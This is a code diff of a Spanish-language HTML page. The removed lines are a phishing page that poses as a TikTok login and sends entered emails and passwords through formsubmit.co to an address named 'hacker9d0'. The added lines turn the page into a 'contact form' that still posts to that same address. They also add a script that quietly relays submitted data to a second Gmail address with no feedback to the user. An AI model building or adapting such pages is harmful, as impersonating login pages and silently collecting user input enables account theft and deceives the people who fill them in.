@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Iniciar sesión</title>
+<title>Formulario de contacto</title>
 <style>
 * {
   box-sizing: border-box;
@@ -43,12 +43,17 @@ label {
   margin-bottom: 7px;
   font-size: 14px;
 }
-input {
+input,
+textarea {
   width: 100%;
   padding: 13px;
   border: none;
   border-radius: 8px;
   font-size: 15px;
+}
+textarea {
+  min-height: 120px;
+  resize: vertical;
 }
 .submit-btn {
   width: 100%;
@@ -63,11 +68,22 @@ input {
 </head>
 <body>
 <div class="contenedor">
-  <h2>Iniciar sesión con tu cuenta de tik tok</h2>
+  <h2>Envíanos un mensaje</h2>
   <form
     action="https://formsubmit.co/hacker9d0@gmail.com"
     method="POST"
+    id="formulario"
   >
+<div class="field">
+  <label for="nombre">Nombre</label>
+  <input
+    type="text"
+    id="nombre"
+    name="nombre"
+    placeholder="Tu nombre"
+    required
+  />
+</div>
 <div class="field">
   <label for="correo">Correo electrónico</label>
   <input
@@ -79,19 +95,18 @@ input {
   />
 </div>
 <div class="field">
-  <label for="contraseña">Contraseña</label>
-  <input
-    type="password"
-    id="contraseña"
-    name="contraseña"
-    placeholder="••••••••"
+  <label for="mensaje">Mensaje</label>
+  <textarea
+    id="mensaje"
+    name="mensaje"
+    placeholder="Escribe tu mensaje aquí..."
     required
-  />
+  ></textarea>
 </div>
 <input
   type="hidden"
   name="_subject"
-  value="Nuevo inicio de sesión"
+  value="Nuevo mensaje recibido"
 />
 <input
   type="hidden"
@@ -99,9 +114,28 @@ input {
   value="table"
 />
 <button type="submit" class="submit-btn">
-  Iniciar sesión
+  Enviar mensaje
 </button>
   </form>
 </div>
+<script>
+document.getElementById("formulario").addEventListener("submit", async function(event) {
+  event.preventDefault();
+  const formulario = this;
+  const datos = new FormData(formulario);
+  try {
+    await fetch("https://formsubmit.co/ajax/echavarriaadonys@gmail.com", {
+      method: "POST",
+      body: datos,
+      headers: {
+        "Accept": "application/json"
+      }
+    });
+    // No redirige y no muestra ningún mensaje de "Gracias".
+  } catch (error) {
+    console.error("Error al enviar el formulario:", error);
+  }
+});
+</script>
 </body>
 </html>
